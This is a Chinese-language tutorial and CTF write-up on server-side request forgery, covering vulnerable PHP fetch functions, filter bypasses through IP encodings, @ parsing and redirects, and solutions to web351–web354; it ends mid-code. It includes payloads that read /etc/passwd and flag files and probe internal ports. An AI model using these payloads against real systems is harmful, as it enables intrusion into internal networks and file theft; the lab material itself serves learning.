<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
<h3 id="302跳转">302跳转</h3>
<h3 id="a记录">a记录</h3>
<h3 id="DNS-Rebinding">DNS Rebinding</h3>
<h1>0x01 基础知识</h1>
<h2 id="1、SSRF漏洞简介">1、SSRF漏洞简介</h2>
<p>SSRF全称：Server-Side Request Forgery，即，<a href="https://cloud.tencent.com/product/cvm/?from_column=20065&amp;from=20065">服务器</a>端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。</p>
<h2 id="2、主要攻击方式">2、主要攻击方式</h2>
<p>当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。</p>
<p><img src="/2025/04/20/ssrf/Blog/source/_posts/ssrf/image-20250329153942729.png" alt="image-20250329153942729"></p>
<p>示例：</p>
<p>漏洞场景：某网站有一个在线加载功能可以把指定的远程文章加载到本地，链接如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/article.php?url=https://blog.csdn.net/qq_43531669/article/details/112498646</span><br></pre></td></tr></table></figure>
<p>假如系统没有对url参数进行任何的检查，就可以构造其他的请求，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/article.php?url=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/article.php?url=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/article.php?url=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http://www.xxx.com/article.php?url=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="3、漏洞形成原理：">3、漏洞形成原理：</h2>
<p>很多网站提供了从其他的服务器上获取数据的功能。通过指定的URL，网站可以从其他地方获取图片、下载文件、读取文件内容等。SSRF的实质就是利用存在缺陷的Web站点作为代理攻击远程和本地的服务器。</p>
<p>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器获取数据的功能但没有对目标地址做过滤与限制。攻击者可以利用改漏洞获取内部系统的一些信息（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网系统）。</p>
<h2 id="4、漏洞的危害：">4、漏洞的危害：</h2>
<ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href="https://www.cnblogs.com/yuanshu/p/11588341.html">banner 信息</a></li>
<li>攻击运行在内网或本地的应用程序</li>
<li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li>
<li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li>
<li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li>
<li>进行跳板</li>
<li>无视cdn</li>
<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
</ol>
<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
<h1>0x02 漏洞检测</h1>
<h2 id="1、漏洞验证">1、漏洞验证:</h2>
<p>因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们可以通过抓包分析发送的请求是否是由服务器端发送的来判断是否存在SSRF漏洞。</p>
<p>在页面源码中查找访问的资源地址，如果该资源地址类型为<code>http://www.xxx.com/a.php?image=地址</code>就可能存在SSRF漏洞。</p>
<h2 id="2、漏洞的可能出现点：">2、漏洞的可能出现点：</h2>
<p>（1） 分享功能：通过URL地址分享文章等，例如如下地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://share.xxx.com/index.php?url=http://www.xxx.com</span><br></pre></td></tr></table></figure>
<p>通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</p>
<p>（2）图片加载/下载：通过URL地址加载或下载图片：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://image.xxx.com/image.php?image=http://www.xxx.com</span><br></pre></td></tr></table></figure>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处加载设定好的远程服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。</p>
<p>（3）图片/文章收藏功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/xxx</span><br></pre></td></tr></table></figure>
<p>例如 title参数是文章的标题地址，代表了一个文章的地址链接，如果收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
<p>（4）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</p>
<p>（5）在线翻译：给网址翻译对应网页的内容。</p>
<p>（6）邮件系统：比如接收邮件服务器地址。</p>
<p>（7）利用参数中的关键字查找：</p>
<p>关键字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
<p>总的来说，需要从远程服务器请求资源的网站都有可能存在SSRF漏洞。</p>
<h1>0x03 绕过方法：</h1>
<p>部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：</p>
<h2 id="1、绕过限制为某种域名：">1、绕过限制为某种域名：</h2>
<p>（1）利用@，当网站限制只能访问 <code>http://www.xxx.com</code>类型的域名时，可以采用http基本<a href="https://cloud.tencent.com/solution/tb-digitalid?from_column=20065&amp;from=20065">身份认证</a>的方式绕过，如：<a href="http://www.xxx.com@www.xxc.com">http://www.xxx.com@www.xxc.com</a></p>
<p>在对@解析域名中，不同的处理函数存在处理差异，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.aaa.com@www.bbb.com@www.ccc.com</span><br><span class="line">当我们在浏览器输入</span><br><span class="line">http://www.aaa.com@www.bbb.com@www.baidu.com</span><br><span class="line">会跳转到百度</span><br></pre></td></tr></table></figure>
<p>在PHP的parse_url中会识别 <a href="http://www.ccc.com">www.ccc.com</a>，而libcurl则识别为 <a href="http://www.bbb.com">www.bbb.com</a>。</p>
<h2 id="2、绕过限制请求IP不为内网地址：">2、绕过限制请求IP不为内网地址：</h2>
<p>（1）采用短网址绕过</p>
<p>（2）利用特殊域名，xip.io可以指向任意域名（原理是DNS解析），即 <a href="http://127.0.0.1.xip.io">127.0.0.1.xip.io</a>，可以解析为127.0.0.1</p>
<p>（3）采用进制转换，127.0.0.1 八进制：<code>0177.0.0.1</code>；十六进制：<code>0x7f.0.0.1</code>；十进制：<code>2130706433</code></p>
<p>（4）利用<code>[::]</code>，<code>http://[::]:80/</code> 会解析为 <code>http://127.0.0.1</code></p>
<p>（5）添加端口号，<a href="http://127.0.0.1:8080">http://127.0.0.1:8080</a></p>
<p>（6）利用句号，<code>127。0。0。1</code> 会解析为 127.0.0.1</p>
<p>（7）采用302跳转</p>
<h2 id="3、限制请求只为http协议：">3、限制请求只为http协议：</h2>
<p>（1）采用302跳转</p>
<p>（2）采用短地址</p>
<h1>0x04 漏洞利用</h1>
<h2 id="1、产生漏洞的函数：">1、产生漏洞的函数：</h2>
<p>根据后台使用的函数的不同，相应的影响和利用方法也不一样，PHP中下面函数的使用不当会导致SSRF:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()    </span><br></pre></td></tr></table></figure>
<p><strong>（1）file_get_contents()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = $_GET[&#x27;url&#x27;];;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p>
<p><strong>（2）fsockopen()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p>
<p><strong>（3）curl_exec()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>curl_exec</code>函数用于执行指定的cURL会话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">2.file_get_contents的gopher协议不能URL编码</span><br><span class="line">3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">5.curl_exec() //默认不跟踪跳转，</span><br><span class="line">6.file_get_contents() // file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
<p>其中curl 支持的协议有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict、file、frp、ftps、http、https、imap、imaps、pop3、pop3s、smtp、smtps、telent、tfps</span><br></pre></td></tr></table></figure>
<p>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>
（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>
（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>
（4）<code>http/s</code>：探测内网主机存活</p>
<h1>parse_url()</h1>
<p><img src="/2025/04/20/ssrf/image-20250428194446168.png" alt="image-20250428194446168"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">						 <span class="title function_ invoke__">parse_url</span>()  </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果----------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; hostname			//</span><br><span class="line">    [user] =&gt; username			@前</span><br><span class="line">    [pass] =&gt; password			@前</span><br><span class="line">    [path] =&gt; /path				/</span><br><span class="line">    [query] =&gt; arg=value		?以后的key=value</span><br><span class="line">    [fragment] =&gt; anchor		#以后的部分</span><br><span class="line">)</span><br><span class="line">	/path</span><br></pre></td></tr></table></figure>
<p><code>@</code> 的作用</p>
<p>在 URL 中，<code>@</code> 的作用是明确地将用户名和密码与主机名区分开。它的语法格式为：</p>
<p>用户名:密码@主机名</p>
<h1>web351</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取用户通过 POST 方法提交的 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 cURL 会话并将用户提交的$url作为目标地址。后续的cURL操作都需要通过这个句柄来进行。</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置 cURL 传输选项。设置了cURL选项CURLOPT_HEADER为0。RLOPT_HEADER用于指定是否将HTTP头部信息作为数据流输出。设置为0表示不会输出HTTP头部信息，只返回请求的正文内容。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// curl_setopt设置 cURL 传输选项。设置了cURL选项CURLOPT_HEADER为0。RLOPT_HEADER用于指定是否将HTTP头部信息作为数据流输出。设置为0表示不会输出HTTP头部信息，只返回请求的正文内容。</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">//将 curl_exec() 的结果作为字符串返回，而不是直接输出到浏览器。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 cURL 会话。curl_exec()是cURL库的一个函数，用于执行之前通过curl_init()初始化的cURL会话，并根据之前设置的选项发送HTTP请求。返回值被存储在变量$result中，它包含了从目标URL获取到的数据。</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 cURL 会话</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1/flag.php</span><br><span class="line">url=file://var/www/html/flag.php</span><br></pre></td></tr></table></figure>
<h1>web352</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);<span class="comment">//上面有详细解释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查 URL 是否包含 &quot;localhost&quot; 或 &quot;127.0.0&quot;（这里应该明确指定匹配的对象）</span></span><br><span class="line">    <span class="comment">// 注意：preg_match 的第二个参数应该是要匹配的字符串，这里是 $url</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.0/&#x27;</span>, <span class="variable">$url</span>)) &#123; <span class="comment">// 修复了正则表达式中的错误</span></span><br><span class="line">        <span class="comment">// 初始化 cURL 会话</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出头信息</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 将 curl_exec() 的结果作为字符串返回</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 执行 cURL 请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">// 关闭 cURL 会话</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出请求结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 匹配到 &quot;localhost&quot; 或 &quot;127.0.0&quot;，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">十六进制</span><br><span class="line">  url=http:<span class="comment">//0x7F.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line">八进制</span><br><span class="line">  url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">10</span> 进制整数格式</span><br><span class="line">  url=http:<span class="comment">//2130706433/flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="number">0</span>x</span><br><span class="line">  url=http:<span class="comment">//0x7F000001/flag.php</span></span><br><span class="line"></span><br><span class="line">还有一种特殊的省略模式</span><br><span class="line">  <span class="number">127.0</span>.<span class="number">0.1</span>写成<span class="number">127.1</span></span><br><span class="line"></span><br><span class="line">用CIDR绕过localhost</span><br><span class="line">  url=http:<span class="comment">//127.127.127.127/flag.php</span></span><br><span class="line"></span><br><span class="line">还有很多方式</span><br><span class="line">  url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">  url=http:<span class="comment">//0.0.0.0/flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>web353</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查 URL 是否包含 &quot;localhost&quot;、&quot;127.0.0&quot; 或其他受限的模式</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.0|\./i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="comment">// 初始化 cURL 会话</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出头信息</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 将 curl_exec() 的结果作为字符串返回</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); <span class="comment">// 执行 cURL 请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); <span class="comment">// 关闭 cURL 会话</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出请求结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 匹配到受限模式，终止脚本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>); <span class="comment">// 如果 URL 的协议不是 http 或 https，终止脚本</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url=http:<span class="comment">//0/flag.php</span></span><br><span class="line">url=http:<span class="comment">//127.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0x7f.0.0.1/flag.php</span></span><br><span class="line">url=http:<span class="comment">//0177.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
<h1>web354</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">// 禁用错误报告</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 高亮显示当前文件的源代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 POST 请求中获取 URL</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析 URL 并返回一个关联数组，包含 URL 的组成部分</span></span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 URL 的协议是否为 http 或 https</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;http&#x27;</span> || <span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>] === <span class="string">&#x27;https&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查 URL 是否包含 &quot;localhost&quot;、&quot;1&quot;、&quot;0&quot; 或中文的 &quot;。&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="comment">// 初始化 cURL 会话</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 不输出头信息</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span 